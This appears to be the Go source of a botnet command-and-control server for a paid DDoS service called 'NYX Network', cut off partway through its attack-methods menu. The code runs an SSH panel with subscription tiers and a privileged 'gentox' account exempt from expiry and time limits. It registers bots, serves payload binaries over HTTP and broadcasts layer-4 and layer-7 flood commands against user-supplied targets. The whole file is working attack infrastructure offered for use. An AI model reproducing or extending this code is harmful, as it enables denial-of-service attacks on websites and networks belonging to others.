package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	mrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/term"
)

type User struct {
	Password    string `json:"password"`
	MaxTime     int    `json:"max_time"`
	Concurrents int    `json:"concurrents"`
	Cooldown    int    `json:"cooldown"`
	VIP         bool   `json:"vip"`
	Reseller    bool   `json:"reseller"`
	Admin       bool   `json:"admin"`
	API         bool   `json:"api"`
	BetaAccess  bool   `json:"beta_access"`
	Expiry      int64  `json:"expiry"`
}

type UserDatabase map[string]User

const (
	userDir  = "User"
	userFile = "Users.json"
	port     = "2222"
)

const rocketFile = `/root/xx/rocket.tfx`

const frameDelay = 40 * time.Millisecond

const (
	TermWidth  = 76
	TermHeight = 28
)

var (
	botCount        int64
	onlineUsers     int64
	bots            sync.Map
	activeAttacks   = make(map[string][]AttackInfo)
	activeAttacksMu sync.Mutex
	colorRed        = "\033[1;31m"
	colorMu         sync.RWMutex
	botPaused       bool
	botPauseMu      sync.Mutex

	activeSessions   = make(map[string]map[string]chan struct{})
	activeSessionsMu sync.Mutex
)

var httpClient = &http.Client{Timeout: 5 * time.Second}

type AttackInfo struct {
	Target   string
	Method   string
	Duration int
	EndTime  int64
	ISP      string
	Country  string
}

type BotClient struct {
	Conn net.Conn
	OS   string
	Arch string
}

type Config struct {
	CNCColor  string `json:"cnc_color"`
	CNCColor2 string `json:"cnc_color_2"`
}

var attackFrames = []string{}

var reANSI = regexp.MustCompile(`\033\[[0-9;]*m`)

func visibleLength(s string) int {
	clean := reANSI.ReplaceAllString(s, "")
	return len([]rune(clean))
}

func convertTFXColors(s string) string {
	reG := regexp.MustCompile(`<<G:(\d+),(\d+),(\d+):(\d+),(\d+),(\d+)>>`)
	s = reG.ReplaceAllStringFunc(s, func(match string) string {
		parts := reG.FindStringSubmatch(match)
		r, _ := strconv.Atoi(parts[1])
		g, _ := strconv.Atoi(parts[2])
		b, _ := strconv.Atoi(parts[3])
		return fmt.Sprintf("\033[38;2;%d;%d;%dm", r, g, b)
	})

	s = strings.ReplaceAll(s, "<<reset>>", "\033[0m")
	s = strings.ReplaceAll(s, "<<clear>>", "\033[2J\033[H")
	s = strings.ReplaceAll(s, "<<hidecursor>>", "\033[?25l")
	s = strings.ReplaceAll(s, "<<showcursor>>", "\033[?25h")

	reSleep := regexp.MustCompile(`<<sleep\(\d+\)>>`)
	s = reSleep.ReplaceAllString(s, "")

	reAny := regexp.MustCompile(`<<[^>]*>>`)
	s = reAny.ReplaceAllString(s, "")

	return s
}

func loadFrames(filename string) error {
	data, err := os.ReadFile(filename)
	if err != nil {
		return err
	}

	content := string(data)

	if strings.Contains(content, "=== FRAME ===") {
		parts := strings.Split(content, "=== FRAME ===")
		for _, part := range parts {
			trimmed := strings.TrimRight(part, " \t\r\n")
			if strings.TrimSpace(trimmed) == "" {
				continue
			}
			attackFrames = append(attackFrames, trimmed)
		}
		return nil
	}

	if strings.Contains(content, "<<sleep(") {
		reSleep := regexp.MustCompile(`<<sleep\(\d+\)>>`)
		content = reSleep.ReplaceAllString(content, "\x00FRAME_BREAK\x00")
		parts := strings.Split(content, "\x00FRAME_BREAK\x00")
		for _, part := range parts {
			trimmed := strings.TrimRight(part, " \t\r\n")
			trimmed = strings.TrimLeft(trimmed, " \t\r\n")
			if strings.TrimSpace(trimmed) == "" {
				continue
			}
			attackFrames = append(attackFrames, trimmed)
		}
		return nil
	}

	trimmed := strings.TrimRight(content, " \t\r\n")
	if strings.TrimSpace(trimmed) != "" {
		attackFrames = append(attackFrames, trimmed)
	}

	return nil
}

func hexToRGB(hex string) (int, int, int) {
	hex = strings.TrimPrefix(hex, "#")
	if len(hex) == 3 {
		hex = string([]byte{hex[0], hex[0], hex[1], hex[1], hex[2], hex[2]})
	}
	if len(hex) > 6 {
		hex = hex[:6]
	}
	if len(hex) != 6 {
		return 255, 0, 0
	}
	r, _ := strconv.ParseInt(hex[0:2], 16, 64)
	g, _ := strconv.ParseInt(hex[2:4], 16, 64)
	b, _ := strconv.ParseInt(hex[4:6], 16, 64)
	return int(r), int(g), int(b)
}

func hexToANSI(hex string) string {
	r, g, b := hexToRGB(hex)
	return fmt.Sprintf("\033[38;2;%d;%d;%dm", r, g, b)
}

func loadConfig() Config {
	file, err := os.ReadFile("config.json")
	if err != nil {
		return Config{CNCColor: "#FF0000"}
	}
	var config Config
	if err := json.Unmarshal(file, &config); err != nil {
		return Config{CNCColor: "#FF0000"}
	}
	return config
}

func getColor() string {
	colorMu.RLock()
	defer colorMu.RUnlock()
	return colorRed
}

func getISP(ip string) (string, string) {
	if ip == "" {
		return "Unknown", "Unknown"
	}
	apiURL := fmt.Sprintf("http://ip-api.com/json/%s?fields=isp,country", ip)
	resp, err := httpClient.Get(apiURL)
	if err != nil {
		return "Unknown", "Unknown"
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "Unknown", "Unknown"
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return "Unknown", "Unknown"
	}

	isp := "Unknown"
	country := "Unknown"
	if val, ok := result["isp"].(string); ok {
		isp = val
	}
	if val, ok := result["country"].(string); ok {
		country = val
	}
	return isp, country
}

func formatExpiry(expiry int64) string {
	now := time.Now().Unix()
	remaining := expiry - now
	if remaining <= 0 {
		return "Expired"
	}

	days := remaining / 86400
	hours := (remaining % 86400) / 3600
	minutes := (remaining % 3600) / 60

	if days > 0 {
		return fmt.Sprintf("%dd %dh", days, hours)
	}
	if hours > 0 {
		return fmt.Sprintf("%dh %dm", hours, minutes)
	}
	return fmt.Sprintf("%dm", minutes)
}

func normalizeTargetServer(t string) string {
	t = strings.TrimSpace(t)
	if t == "" {
		return t
	}

	if strings.Contains(t, "://") {
		if u, err := url.Parse(t); err == nil {
			t = u.Host
		}
	}

	if idx := strings.LastIndex(t, ":"); idx != -1 {
		if _, err := strconv.Atoi(t[idx+1:]); err == nil {
			t = t[:idx]
		}
	}

	if idx := strings.Index(t, "/"); idx != -1 {
		t = t[:idx]
	}

	return t
}

func showAttackFrame(t *term.Terminal) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("showAttackFrame panic: %v", r)
		}
	}()

	if len(attackFrames) == 0 {
		return
	}

	ClearScreen := "\033[2J\033[H"
	HideCursor := "\033[?25l"
	ShowCursor := "\033[?25h"
	Reset := "\033[0m"

	t.Write([]byte(HideCursor))

	for i := 0; i < len(attackFrames); i++ {
		t.Write([]byte(ClearScreen))

		frame := convertTFXColors(attackFrames[i])

		frame = strings.ReplaceAll(frame, "\r", "")
		frame = strings.ReplaceAll(frame, "\t", "    ")

		lines := strings.Split(frame, "\n")
		for _, line := range lines {
			line = strings.TrimRight(line, " \t\n")

			if strings.TrimSpace(line) == "" {
				continue
			}

			visibleLen := visibleLength(line)
			pad := (TermWidth - visibleLen) / 2
			if pad < 0 {
				pad = 0
			}
			indent := strings.Repeat(" ", pad)

			t.Write([]byte(Reset + indent + line + Reset + "\r\n"))
		}

		time.Sleep(frameDelay)
	}

	t.Write([]byte(ShowCursor))
	t.Write([]byte(ClearScreen))
	time.Sleep(100 * time.Millisecond)
}

func printAttackSent(t *term.Terminal, target, port, duration, method, isp, country string, bots int64) {
	Blue := "\033[1;94m"
	White := "\033[1;97m"
	Yellow := "\033[1;93m"
	Reset := "\033[0m"

	ClearScreen := "\033[2J\033[H"

	var sb strings.Builder

	sb.WriteString(ClearScreen)

	banner := []string{
		"                      ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗",
		"                      ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║║",
		"                      ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝═╩╝𝓧𝓥",
	}
	for _, line := range banner {
		sb.WriteString(Blue + line + Reset + "\r\n")
	}

	sb.WriteString(Blue + "               " + Yellow + "🌙" + Blue + " Attack Successfuly Sent To All Out Servers " + Yellow + "🌙" + Reset + "\r\n")

	sb.WriteString(Blue + "             ╔═══════════════════════════════════════════════════" + Reset + "\r\n")

	rows := []struct {
		Label string
		Value string
	}{
		{"Target", target},
		{"Port", port},
		{"Duration", duration},
		{"Methods", method},
		{"ISP", isp},
		{"Country", country},
	}

	for _, row := range rows {
		sb.WriteString(Blue + "             ║ " + Reset)
		sb.WriteString(White + fmt.Sprintf("%-10s", row.Label+":") + Reset)
		sb.WriteString(" ")
		sb.WriteString(White + row.Value + Reset)
		sb.WriteString("\r\n")
	}

	sb.WriteString(Blue + "             ╚═══════════════════════════════════════════════════" + Reset + "\r\n")

	sb.WriteString(Blue + "                       Join https://discord.gg/p9gUDfKs97" + Reset + "\r\n")

	sb.WriteString(Blue + "             ╔══════════════════════════════════════════════════╗" + Reset + "\r\n")
	sb.WriteString(Blue + "             ║ ████████████████████████████████████████████████ ║" + Reset + "\r\n")
	sb.WriteString(Blue + "             ╚══════════════════════════════════════════════════╝" + Reset + "\r\n")

	t.Write([]byte(sb.String()))
}

func main() {
	cfg := loadConfig()
	colorRed = hexToANSI(cfg.CNCColor)

	if err := loadFrames(rocketFile); err != nil {
		log.Printf("Warning: could not load frames from %s: %v", rocketFile, err)
	} else {
		log.Printf("Loaded %d attack frames from %s", len(attackFrames), rocketFile)
	}

	if err := initStorage(); err != nil {
		log.Fatalf("Failed to init storage: %v", err)
	}

	startBetaBotSimulation()

	config := &ssh.ServerConfig{
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			users, err := loadUsers()
			if err != nil {
				return nil, err
			}
			if user, ok := users[c.User()]; ok && user.Password == string(pass) {
				if time.Now().Unix() > user.Expiry && c.User() != "gentox" {
					return nil, fmt.Errorf("account %q has expired", c.User())
				}
				return nil, nil
			}
			return nil, fmt.Errorf("password rejected for %q", c.User())
		},
	}

	hostKey, err := loadOrGenerateHostKey()
	if err != nil {
		log.Fatalf("Failed to generate host key: %v", err)
	}
	config.AddHostKey(hostKey)

	go func() {
		binPort := "9174"
		binListener, err := net.Listen("tcp", "0.0.0.0:"+binPort)
		if err != nil {
			log.Printf("Failed to listen on bin port %s: %v", binPort, err)
			return
		}
		log.Printf("Bin Server listening on 0.0.0.0:%s", binPort)
		for {
			conn, err := binListener.Accept()
			if err != nil {
				continue
			}
			go handleBinConnection(conn)
		}
	}()

	go func() {
		payloadPort := "8080"
		log.Printf("Payload Server listening on 0.0.0.0:%s (serving ./bin)", payloadPort)
		http.Handle("/", http.FileServer(http.Dir("./bin")))
		if err := http.ListenAndServe("0.0.0.0:"+payloadPort, nil); err != nil {
			log.Printf("HTTP Server failed: %v", err)
		}
	}()

	go func() {
		apiPort := "3333"
		log.Printf("API Server listening on 0.0.0.0:%s", apiPort)
		mux := http.NewServeMux()
		mux.HandleFunc("/api", handleAPI)
		if err := http.ListenAndServe("0.0.0.0:"+apiPort, mux); err != nil {
			log.Printf("API Server failed: %v", err)
		}
	}()

	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		log.Fatalf("Failed to listen on %s: %v", port, err)
	}

	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			kickExpiredUsers()
		}
	}()

	pubIP := getPublicIP()
	log.Printf("SSH Server listening on 0.0.0.0:%s", port)
	if pubIP != "" {
		log.Printf("To connect from the internet, use Public IP: %s", pubIP)
	}

	for {
		nConn, err := listener.Accept()
		if err != nil {
			log.Printf("Failed to accept: %v", err)
			continue
		}
		go handleSSHConnection(nConn, config)
	}
}

func getPublicIP() string {
	resp, err := httpClient.Get("https://api.ipify.org")
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	ip, err := io.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(ip))
}

func registerSession(username string) (string, chan struct{}) {
	sessionID := fmt.Sprintf("%s#%d", username, time.Now().UnixNano())
	stopCh := make(chan struct{})

	activeSessionsMu.Lock()
	if activeSessions[username] == nil {
		activeSessions[username] = make(map[string]chan struct{})
	}
	activeSessions[username][sessionID] = stopCh
	activeSessionsMu.Unlock()

	return sessionID, stopCh
}

func unregisterSession(username, sessionID string) {
	activeSessionsMu.Lock()
	if sessions, ok := activeSessions[username]; ok {
		delete(sessions, sessionID)
		if len(sessions) == 0 {
			delete(activeSessions, username)
		}
	}
	activeSessionsMu.Unlock()
}

func kickUser(username string) {
	activeSessionsMu.Lock()
	sessions := activeSessions[username]
	delete(activeSessions, username)
	activeSessionsMu.Unlock()

	for _, stopCh := range sessions {
		select {
		case <-stopCh:
		default:
			close(stopCh)
		}
	}
}

func kickExpiredUsers() {
	users, err := loadUsers()
	if err != nil {
		return
	}

	now := time.Now().Unix()
	activeSessionsMu.Lock()
	var toKick []string
	for username := range activeSessions {
		if u, ok := users[username]; ok {
			if u.Expiry > 0 && now > u.Expiry && username != "gentox" {
				toKick = append(toKick, username)
			}
		} else {
			toKick = append(toKick, username)
		}
	}
	activeSessionsMu.Unlock()

	for _, username := range toKick {
		kickUser(username)
	}
}

func handleBinConnection(conn net.Conn) {
	scanner := bufio.NewScanner(conn)
	var osName, archName string = "Unknown", "Unknown"

	if scanner.Scan() {
		line := scanner.Text()
		parts := strings.Fields(line)
		if len(parts) >= 3 && parts[0] == "REGISTER" {
			osName = parts[1]
			archName = parts[2]
		}
	}

	addr := conn.RemoteAddr().String()
	client := BotClient{
		Conn: conn,
		OS:   osName,
		Arch: archName,
	}

	bots.Store(addr, client)
	atomic.AddInt64(&botCount, 1)
	log.Printf("Bot connected: %s (OS: %s, Arch: %s)", addr, osName, archName)

	defer func() {
		bots.Delete(addr)
		atomic.AddInt64(&botCount, -1)
		conn.Close()
		log.Printf("Bot disconnected: %s", addr)
	}()

	for scanner.Scan() {
	}
}

func broadcast(cmd string) {
	isStopCmd := strings.HasPrefix(cmd, "stop ")

	if !isStopCmd {
		botPauseMu.Lock()
		paused := botPaused
		botPauseMu.Unlock()
		if paused {
			return
		}
	}

	bots.Range(func(key, value interface{}) bool {
		client, ok := value.(BotClient)
		if !ok {
			return true
		}
		go func(c net.Conn, k interface{}) {
			defer func() {
				if r := recover(); r != nil {
					log.Printf("Broadcast panic to %v: %v", k, r)
				}
			}()
			if c == nil {
				return
			}
			c.SetWriteDeadline(time.Now().Add(2 * time.Second))
			if _, err := c.Write([]byte(cmd + "\n")); err != nil {
				log.Printf("Failed to send cmd to bot %v: %v", k, err)
			}
		}(client.Conn, key)
		return true
	})
}

func handleSSHConnection(nConn net.Conn, config *ssh.ServerConfig) {
	conn, chans, reqs, err := ssh.NewServerConn(nConn, config)
	if err != nil {
		return
	}
	defer conn.Close()

	log.Printf("User %q logged in from %s", conn.User(), nConn.RemoteAddr())

	go ssh.DiscardRequests(reqs)

	// Kliens IP kinyerése (port nélkül)
	clientIP := nConn.RemoteAddr().String()
	if host, _, err := net.SplitHostPort(clientIP); err == nil {
		clientIP = host
	}

	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
			continue
		}

		channel, requests, err := newChannel.Accept()
		if err != nil {
			log.Printf("Could not accept channel: %v", err)
			continue
		}

		go handleSession(channel, requests, conn.User(), clientIP)
	}
}

func handleL4Attack(t *term.Terminal, username, cmdName string, args []string, ColorWhite, ColorReset string) {
	if len(args) < 4 {
		t.Write([]byte(fmt.Sprintf("(cnc) Correct format %s [ip] [port] [time]\r\n", cmdName)))
		t.Write([]byte(fmt.Sprintf("      Example: %s 8.8.8.8 53 30\r\n", cmdName)))
		return
	}
	users, _ := loadUsers()
	u, ok := users[username]
	if !ok {
		t.Write([]byte(ColorWhite + "User not found.\r\n" + ColorReset))
		return
	}
	duration, err := strconv.Atoi(args[3])
	if err != nil || duration <= 0 {
		t.Write([]byte(ColorWhite + "Invalid duration.\r\n" + ColorReset))
		return
	}
	if duration > u.MaxTime && username != "gentox" {
		t.Write([]byte(fmt.Sprintf("%sYour maximum attack time is %d seconds.\r\n", ColorWhite, u.MaxTime)))
		return
	}
	activeAttacksMu.Lock()
	if len(activeAttacks[username]) >= u.Concurrents {
		activeAttacksMu.Unlock()
		t.Write([]byte(fmt.Sprintf("%sYou have hit your concurrent limit (%d/%d)\r\n", ColorWhite, len(activeAttacks[username]), u.Concurrents)))
		return
	}

	target := args[1]
	port := args[2]
	isp, country := getISP(target)

	attack := AttackInfo{
		Target:   target,
		Method:   cmdName,
		Duration: duration,
		EndTime:  time.Now().Unix() + int64(duration),
		ISP:      isp,
		Country:  country,
	}
	activeAttacks[username] = append(activeAttacks[username], attack)
	activeAttacksMu.Unlock()

	cmdLine := fmt.Sprintf("%s %s %s %d", cmdName, target, port, duration)
	broadcast(cmdLine)

	go func(user string, d int, target string, method string) {
		time.Sleep(time.Duration(d) * time.Second)
		activeAttacksMu.Lock()
		defer activeAttacksMu.Unlock()
		attacks := activeAttacks[user]
		for i, atk := range attacks {
			if atk.Target == target && atk.Method == method {
				activeAttacks[user] = append(attacks[:i], attacks[i+1:]...)
				break
			}
		}
	}(username, duration, target, cmdName)

	showAttackFrame(t)

	count := atomic.LoadInt64(&botCount)
	printAttackSent(t, target, port, strconv.Itoa(duration), cmdName, isp, country, count)
}

func handleL7Attack(t *term.Terminal, username, cmdName string, args []string, ColorWhite, ColorReset string) {
	if len(args) < 3 {
		t.Write([]byte(fmt.Sprintf("(cnc) Correct format %s [url] [time]\r\n", cmdName)))
		t.Write([]byte(fmt.Sprintf("      Example: %s https://example.com 30\r\n", cmdName)))
		return
	}
	users, _ := loadUsers()
	u, ok := users[username]
	if !ok {
		t.Write([]byte(ColorWhite + "User not found.\r\n" + ColorReset))
		return
	}
	duration, err := strconv.Atoi(args[2])
	if err != nil || duration <= 0 {
		t.Write([]byte(ColorWhite + "Invalid duration.\r\n" + ColorReset))
		return
	}
	if duration > u.MaxTime && username != "gentox" {
		t.Write([]byte(fmt.Sprintf("%sYour maximum attack time is %d seconds.\r\n", ColorWhite, u.MaxTime)))
		return
	}
	activeAttacksMu.Lock()
	if len(activeAttacks[username]) >= u.Concurrents {
		activeAttacksMu.Unlock()
		t.Write([]byte(fmt.Sprintf("%sYou have hit your concurrent limit (%d/%d)\r\n", ColorWhite, len(activeAttacks[username]), u.Concurrents)))
		return
	}

	target := args[1]
	isp, country := getISP("")
	if strings.Contains(target, "://") {
		parts := strings.Split(target, "://")
		if len(parts) > 1 {
			domain := strings.Split(parts[1], "/")[0]
			isp, country = getISP(domain)
		}
	}

	attack := AttackInfo{
		Target:   target,
		Method:   cmdName,
		Duration: duration,
		EndTime:  time.Now().Unix() + int64(duration),
		ISP:      isp,
		Country:  country,
	}
	activeAttacks[username] = append(activeAttacks[username], attack)
	activeAttacksMu.Unlock()

	cmdLine := fmt.Sprintf("%s %s %d", cmdName, target, duration)
	broadcast(cmdLine)

	go func(user string, d int, target string, method string) {
		time.Sleep(time.Duration(d) * time.Second)
		activeAttacksMu.Lock()
		defer activeAttacksMu.Unlock()
		attacks := activeAttacks[user]
		for i, atk := range attacks {
			if atk.Target == target && atk.Method == method {
				activeAttacks[user] = append(attacks[:i], attacks[i+1:]...)
				break
			}
		}
	}(username, duration, target, cmdName)

	showAttackFrame(t)

	count := atomic.LoadInt64(&botCount)
	printAttackSent(t, target, "-", strconv.Itoa(duration), cmdName, isp, country, count)
}

func handleXResetAttack(t *term.Terminal, username, cmdName string, args []string, ColorWhite, ColorReset string) {
	if len(args) < 4 {
		t.Write([]byte(fmt.Sprintf("(cnc) Correct format %s [url] [port] [time]\r\n", cmdName)))
		t.Write([]byte(fmt.Sprintf("      Example: %s https://example.com 443 30\r\n", cmdName)))
		return
	}
	users, _ := loadUsers()
	u, ok := users[username]
	if !ok {
		t.Write([]byte(ColorWhite + "User not found.\r\n" + ColorReset))
		return
	}
	duration, err := strconv.Atoi(args[3])
	if err != nil || duration <= 0 {
		t.Write([]byte(ColorWhite + "Invalid duration.\r\n" + ColorReset))
		return
	}
	if duration > u.MaxTime && username != "gentox" {
		t.Write([]byte(fmt.Sprintf("%sYour maximum attack time is %d seconds.\r\n", ColorWhite, u.MaxTime)))
		return
	}
	activeAttacksMu.Lock()
	if len(activeAttacks[username]) >= u.Concurrents {
		activeAttacksMu.Unlock()
		t.Write([]byte(fmt.Sprintf("%sYou have hit your concurrent limit (%d/%d)\r\n", ColorWhite, len(activeAttacks[username]), u.Concurrents)))
		return
	}

	target := args[1]
	port := args[2]

	isp, country := getISP("")
	if strings.Contains(target, "://") {
		parts := strings.Split(target, "://")
		if len(parts) > 1 {
			domain := strings.Split(parts[1], "/")[0]
			isp, country = getISP(domain)
		}
	}

	attack := AttackInfo{
		Target:   target,
		Method:   cmdName,
		Duration: duration,
		EndTime:  time.Now().Unix() + int64(duration),
		ISP:      isp,
		Country:  country,
	}
	activeAttacks[username] = append(activeAttacks[username], attack)
	activeAttacksMu.Unlock()

	cmdLine := fmt.Sprintf("%s %s %s %d", cmdName, target, port, duration)
	broadcast(cmdLine)

	go func(user string, d int, target string, method string) {
		time.Sleep(time.Duration(d) * time.Second)
		activeAttacksMu.Lock()
		defer activeAttacksMu.Unlock()
		attacks := activeAttacks[user]
		for i, atk := range attacks {
			if atk.Target == target && atk.Method == method {
				activeAttacks[user] = append(attacks[:i], attacks[i+1:]...)
				break
			}
		}
	}(username, duration, target, cmdName)

	showAttackFrame(t)

	count := atomic.LoadInt64(&botCount)
	printAttackSent(t, target, port, strconv.Itoa(duration), cmdName, isp, country, count)
}

func handleSession(channel ssh.Channel, requests <-chan *ssh.Request, username string, clientIP string) {
	atomic.AddInt64(&onlineUsers, 1)
	defer atomic.AddInt64(&onlineUsers, -1)
	defer channel.Close()

	sessionID, kickCh := registerSession(username)
	defer unregisterSession(username, sessionID)

	stopTitle := make(chan struct{})
	defer close(stopTitle)

	go func() {
		select {
		case <-kickCh:
			channel.Write([]byte("\r\n\033[91m[!] Your session has been terminated by an admin or your account expired.\033[0m\r\n"))
			time.Sleep(300 * time.Millisecond)
			channel.Close()
		case <-stopTitle:
			return
		}
	}()

	go func() {
		ticker := time.NewTicker(200 * time.Millisecond)
		defer ticker.Stop()

		spinner := []string{"[/]", "[-]", "[\\]", "[|]"}
		spinIdx := 0

		for {
			select {
			case <-stopTitle:
				return
			case <-ticker.C:
				users, err := loadUsers()
				if err != nil {
					continue
				}
				u, ok := users[username]
				if !ok {
					continue
				}

				activeAttacksMu.Lock()
				userAttacks := len(activeAttacks[username])
				totalAttacks := 0
				for _, atks := range activeAttacks {
					totalAttacks += len(atks)
				}
				activeAttacksMu.Unlock()

				botsN := atomic.LoadInt64(&botCount)
				onlines := atomic.LoadInt64(&onlineUsers)

				expiresText := formatExpiry(u.Expiry)

				s := spinner[spinIdx%len(spinner)]
				spinIdx++

				title := fmt.Sprintf("\033]0;%s NYX Network | Device: %d | Online: %d | Active: %d | Slots: %d/%d | Expires: %s\007",
					s, botsN, onlines, totalAttacks, userAttacks, u.Concurrents, expiresText)

				channel.Write([]byte(title))
			}
		}
	}()

	const (
		ClearScreen  = "\033[2J\033[H"
		ResizeWindow = "\033[8;29;76t"
		ColorReset   = "\033[0m"
		ColorCyan    = "\033[1;36m"
		ColorWhite   = "\033[1;37m"
		ColorGray    = "\033[90m"
		ColorGreen   = "\033[92m"
		ColorYellow  = "\033[93m"
		ColorRed     = "\033[91m"
		ColorBlue    = "\033[94m"
		ColorMagenta = "\033[95m"
	)
	_ = ColorCyan
	_ = ColorMagenta

	cRed := getColor()
	prompt := fmt.Sprintf("\033[1;94m┌──(\033[1;97m%s@\033[1;94mnyx)\r\n\033[1;94m└─➤ \033[0m", username)

	t := term.NewTerminal(channel, "")

	go func() {
		for req := range requests {
			switch req.Type {
			case "shell":
				req.Reply(true, nil)
			case "pty-req":
				t.SetSize(TermWidth, TermHeight)
				req.Reply(true, nil)
			default:
				req.Reply(false, nil)
			}
		}
	}()

	t.Write([]byte(ResizeWindow + ClearScreen))

	Blue := "\033[1;94m"
	Gray := "\033[90m"
	Reset := "\033[0m"

	welcome := "" +
		"\n" +
		Blue + "                          ███    ██ ██    ██ ██   ██ \n" +
		"                          ████   ██  ██  ██   ██ ██  \n" +
		"                          ██ ██  ██   ████     ███   \n" +
		"                          ██  ██ ██    ██     ██ ██  \n" +
		"                          ██   ████    ██    ██   ██ \n" +
		"\n" +
		"           # -------------- Welcome to NYX Network -------------- #\n" +
		"\n" +
		"                          \n" +
		"              ┌────────────────────────────────────────────────┐\n" +
		"              │" + Reset + Gray + "   Welcome To The Start Screen Of Nyx Network   " + Reset + Blue + "│\n" +
		"              │" + Reset + Gray + "       Type [Help] For A List Of Commands       " + Reset + Blue + "│\n" +
		"              └────────────────────────────────────────────────┘\n" +
		"\n" +
		"              ┌────────────────────────────────────────────────┐\n" +
		"              │" + Reset + Gray + "  Copyright © 2026 Nyx All Rights Reserved.     " + Reset + Blue + "│\n" +
		"              └────────────────────────────────────────────────┘\n" +
		Reset + "\n"

	t.Write([]byte(welcome))

	for {
		users, err := loadUsers()
		if err == nil {
			if u, ok := users[username]; !ok {
				t.Write([]byte("\r\n\033[91m[!] Your account has been deleted.\033[0m\r\n"))
				time.Sleep(500 * time.Millisecond)
				return
			} else if u.Expiry > 0 && time.Now().Unix() > u.Expiry && username != "gentox" {
				t.Write([]byte("\r\n\033[91m[!] Your account has expired.\033[0m\r\n"))
				time.Sleep(500 * time.Millisecond)
				return
			}
		}

		t.Write([]byte(prompt))

		line, err := t.ReadLine()
		if err != nil {
			if err != io.EOF {
				log.Printf("Read error: %v", err)
			}
			break
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		args := strings.Fields(line)
		if len(args) == 0 {
			continue
		}
		cmdName := strings.ToLower(args[0])

		switch cmdName {
		case "help":
			t.SetSize(76, 22)

			users, _ := loadUsers()
			u, ok := users[username]
			if !ok {
				t.Write([]byte(ColorRed + "User not found.\r\n" + ColorReset))
				continue
			}

			B := ColorBlue
			G := ColorGray
			R := ColorReset

			var sb strings.Builder
			sb.WriteString(ClearScreen)
			sb.WriteString("\r\n")
			sb.WriteString(B + "╔═════════════════════════════════════════════════════════════════════════╗" + R + "\r\n")
			sb.WriteString(B + "║" + R + G + " help            - Shows this menu                                       " + B + "║" + R + "\r\n")
			sb.WriteString(B + "║" + R + G + " methods         - Shows all attack methods                              " + B + "║" + R + "\r\n")
			sb.WriteString(B + "║" + R + G + " tos             - Shows the Terms of Service                            " + B + "║" + R + "\r\n")
			sb.WriteString(B + "║" + R + G + " plan            - Shows your account details                            " + B + "║" + R + "\r\n")
			sb.WriteString(B + "║" + R + G + " passwd          - Change your password                                  " + B + "║" + R + "\r\n")
			sb.WriteString(B + "║" + R + G + " ongoing         - Shows your active attacks                             " + B + "║" + R + "\r\n")
			sb.WriteString(B + "║" + R + G + " myip            - Shows your IP address and country                     " + B + "║" + R + "\r\n")
			sb.WriteString(B + "║" + R + G + " portcheck       - Check if a port is open on an IP                      " + B + "║" + R + "\r\n")

			if username == "gentox" || u.Admin {
				sb.WriteString(B + "║" + R + G + " bots            - Shows all connected bots                              " + B + "║" + R + "\r\n")
				sb.WriteString(B + "║" + R + G + " users list      - List all users                                        " + B + "║" + R + "\r\n")
				sb.WriteString(B + "║" + R + G + " users add       - Add a new user                                        " + B + "║" + R + "\r\n")
				sb.WriteString(B + "║" + R + G + " users delete    - Delete a user                                         " + B + "║" + R + "\r\n")
				sb.WriteString(B + "║" + R + G + " suicide         - Stops ALL attacks from ALL users                      " + B + "║" + R + "\r\n")
				sb.WriteString(B + "║" + R + G + " stop            - Stops an attack by target                             " + B + "║" + R + "\r\n")
			}

			sb.WriteString(B + "║" + R + G + " owner           - Shows the owner info                                  " + B + "║" + R + "\r\n")
			sb.WriteString(B + "║" + R + G + " exit            - Disconnects from CNC                                  " + B + "║" + R + "\r\n")
			sb.WriteString(B + "╚═════════════════════════════════════════════════════════════════════════╝" + R + "\r\n")

			t.Write([]byte(sb.String()))

		case "tos":
			t.Write([]byte(ClearScreen))

			tosText := "" +
				"\r\n" +
				ColorBlue + "TOS NYX Network\r\n" +
				"\r\n" +
				ColorWhite + "English:\r\n" +
				ColorGray + "- A little spam is allowed, but no abuse\r\n" +
				"- No refunds\r\n" +
				"- Don't spam on dstat\r\n" +
				"- Try it just to test your network\r\n" +
				ColorRed + "- It is strictly forbidden to attack government websites\r\n" +
				"- It is strictly forbidden to attack school websites\r\n" +
				ColorGray + "- Don't launch it on infrastructure that doesn't belong to you\r\n" +
				"- If these TOS are not respected, you risk getting banned\r\n" +
				"\r\n" +
				ColorWhite + "Magyar:\r\n" +
				ColorGray + "- Egy kis spam megengedett, de visszaélés nem\r\n" +
				"- Nincs visszatérítés\r\n" +
				"- Ne spammelj a dstat-on\r\n" +
				"- Csak a saját hálózatod tesztelésére használd\r\n" +
				ColorRed + "- Szigorúan tilos állami weboldalakat támadni\r\n" +
				"- Szigorúan tilos iskolai weboldalakat támadni\r\n" +
				ColorGray + "- Ne indítsd olyan infrastruktúrára, ami nem a tiéd\r\n" +
				"- Ha ezeket a TOS-okat nem tartod be, kitilthatnak\r\n" +
				ColorReset

			t.Write([]byte(tosText))

		case "methods":
			t.Write([]byte(ClearScreen))

			ColorBasic := "\033[93m"
			ColorVIP := "\033[38;5;208m"

			l4Methods := []struct {
				Name string
				Tag  string
				Desc string
			}{
				{"RAW", "ALL", "TCP + UDP Combined Flood"},
